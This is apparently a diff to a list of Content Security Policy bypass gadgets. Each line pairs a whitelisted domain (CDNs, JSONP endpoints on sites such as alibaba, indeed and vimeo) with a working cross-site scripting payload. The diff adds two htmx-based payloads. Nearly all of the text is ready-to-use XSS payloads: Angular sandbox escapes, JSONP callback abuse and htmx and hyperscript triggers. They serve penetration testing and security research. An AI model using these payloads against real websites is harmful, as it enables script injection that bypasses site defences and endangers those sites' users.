@@ -54,6 +54,7 @@ cdn.bootcdn.net	<script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.3/
 cdn.bootcss.com	<script src="https://cdn.bootcss.com/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>
 cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
+cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/npm/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">
 cdn.shopify.com	<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/files/a.js"></script>
 cdn.staticfile.org	<script src="https://cdn.staticfile.org/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 cdn.syncfusion.com	<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
@@ -178,6 +179,7 @@ ug.alibaba.com	<script src="https://ug.alibaba.com/api/ship/read?callback=alert"
 uk.indeed.com	<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>
 ulogin.ru	<script src="https://ulogin.ru/token.php?callback=alert(1337)"></script>
 unpkg.com	<script src="https://unpkg.com/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
+unpkg.com	<script src="https://unpkg.com/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">
 unpkg.com	<script src="https://unpkg.com/hyperscript.org"></script><x _="on load alert(1)">
 urs.pbs.org	<script src="https://urs.pbs.org/redirect/1/?format=jsonp&callback=alert(1)"></script>
 vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>
